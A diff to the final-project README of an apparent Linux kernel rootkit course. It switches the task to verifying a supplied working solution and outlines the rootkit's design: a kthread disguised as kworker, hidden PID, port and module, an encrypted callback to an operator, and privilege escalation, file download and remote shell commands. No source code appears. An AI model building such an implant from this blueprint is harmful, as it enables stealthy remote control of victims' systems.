@@ -2,9 +2,8 @@
 
 This is the final project.
 You have built every subsystem across 27 lessons and 6 milestones.
-Now assemble them into one clean, commented kernel module and run the complete
-verification checklist.
-Every line of code is yours.
+The starter is your M05 solution, fully working.
+Run the verification checklist below to confirm every capability end to end.
 
 ## Verification checklist
 
@@ -36,8 +35,8 @@ From the operator machine (or localhost for testing):
 ./operator --key "$key" --host <target> --port 4444
 ```
 
-The connection should succeed.
-The encrypted handshake validates the key fingerprint before any commands are
+The agent connects OUT to the operator (callback architecture).
+The encrypted handshake validates the shared key before any commands are
 accepted.
 
 ### 4. Basic commands
@@ -173,7 +172,7 @@ While connected:
 
 ```sh
 ps aux | grep kworker/u8:3    # agent kthread is hidden
-ss -tlnp | grep 4444          # control port is hidden
+ss -tlnp | grep 4444          # connection port is hidden
 ```
 
 Disconnect the operator, then:
@@ -212,15 +211,15 @@ Verify:
 ```text
 insmod rklings.ko control_key=<hex>
     |
-    +-- parse key, compute fingerprint, zero parameter
-    +-- create TCP listen socket on port 4444
-    +-- register 5 kretprobes (mkdir, getdents64, read, tcp4/6_seq)
+    +-- parse key, zero parameter
+    +-- init target lists, kretprobes, shell subsystem
     +-- spawn agent kthread (disguised as kworker/u8:3)
     |
     +-- agent loop:
          |
-         +-- kernel_accept (wait for operator)
-         +-- auto-hide PID + port
+         +-- rk_connect() to operator (callback, exponential backoff)
+         +-- AEAD handshake (HELLO exchange)
+         +-- auto-hide kthread PID + connection port
          +-- recv/decrypt/dispatch loop:
          |     |
          |     +-- PING, INFO, STATUS
@@ -230,33 +229,29 @@ insmod rklings.ko control_key=<hex>
          |     +-- ESCALATE
          |     +-- DOWNLOAD <path>
          |     +-- SHELL, EXEC <cmd>
+         |     +-- CLOAK/UNCLOAK
          |
          +-- auto-unhide PID + port
-         +-- sock_release(client)
+         +-- crypto_free_aead, sock_release
+         +-- retry with backoff
 
 rmmod rklings
     |
     +-- restore module visibility
     +-- stop kthread
     +-- shutdown + release socket
-    +-- unregister 5 kretprobes
+    +-- unregister kretprobes
     +-- zero key material
 ```
 
 ## Your task
 
-Write the complete `main.c` from scratch, pulling in every subsystem.
-Use the verification checklist above to validate each capability.
-When every check passes, you have a complete rootkit.
+Your starter is the complete, working M05 solution.
+Review the code, understand every subsystem, then run the full checklist.
+If any check fails, trace the issue through the code and fix it.
 
 Run:
 
 ```sh
 ./rklings check
 ```
-
-## References
-
-- All lesson references (L00 through L26) apply
-- [Linux kernel module documentation](https://docs.kernel.org/7.2/kbuild/modules.html)
-- [Kernel crypto API](https://docs.kernel.org/7.2/crypto/index.html)
